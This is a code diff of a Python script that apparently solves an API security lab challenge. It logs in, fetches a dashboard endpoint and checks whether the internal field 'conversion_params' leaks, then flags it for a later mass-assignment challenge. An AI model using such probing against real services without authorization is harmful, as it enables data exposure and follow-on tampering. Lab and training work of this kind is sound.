@@ -17,14 +17,13 @@ def login(base_url: str, email: str, password: str, timeout: float = 15) -> Opti
     except:
         return None
 
-def get_user_videos(base_url: str, token: str, timeout: float = 15) -> List[Dict[str, Any]]:
+def get_dashboard(base_url: str, token: str, timeout: float = 15) -> Optional[Dict[str, Any]]:
     headers = {"Authorization": f"Bearer {token}"}
     try:
-        r = requests.get(f"{base_url.rstrip('/')}/identity/api/v2/user/videos",
-                        headers=headers, timeout=timeout).json()
-        return r.get("videos") or r.get("data") or []
+        return requests.get(f"{base_url.rstrip('/')}/identity/api/v2/user/dashboard",
+                           headers=headers, timeout=timeout).json()
     except:
-        return []
+        return None
 
 def main():
     parser = argparse.ArgumentParser(description="Challenge 5: Internal Video Property")
@@ -43,22 +42,20 @@ def main():
         print("[!] Login failed"); sys.exit(1)
     print("[+] Logged in")
 
-    videos = get_user_videos(base_url, token)
-    if not videos:
+    dashboard = get_dashboard(base_url, token)
+    if not dashboard or dashboard.get("video_id") is None:
         print("[!] No videos found"); sys.exit(1)
 
     print(f"\n[*] Analyzing video response for internal properties...")
-    for i, video in enumerate(videos[:3]):
-        print(f"\n[Video {i+1}]")
-        print(f"  ID: {video.get('id')}")
-        print(f"  Name: {video.get('video_name')}")
-        if "conversion_params" in video:
-            print(f"  [LEAKED] conversion_params: {video.get('conversion_params')}")
-            print(f"\n[!] VULNERABLE: Internal property 'conversion_params' exposed")
-            print(f"[!] Can be exploited in Challenge 10 (Mass Assignment)")
-            return
-
-    print("\n[!] conversion_params not found in current videos")
+    print(f"\n[Video 1]")
+    print(f"  ID: {dashboard.get('video_id')}")
+    print(f"  Name: {dashboard.get('video_name')}")
+    if "conversion_params" in dashboard:
+        print(f"  [LEAKED] conversion_params: {dashboard.get('conversion_params')}")
+        print(f"\n[!] VULNERABLE: Internal property 'conversion_params' exposed")
+        print(f"[!] Can be exploited in Challenge 10 (Mass Assignment)")
+    else:
+        print(f"\n[!] conversion_params not exposed in this response")
 
 if __name__ == "__main__":
     main()
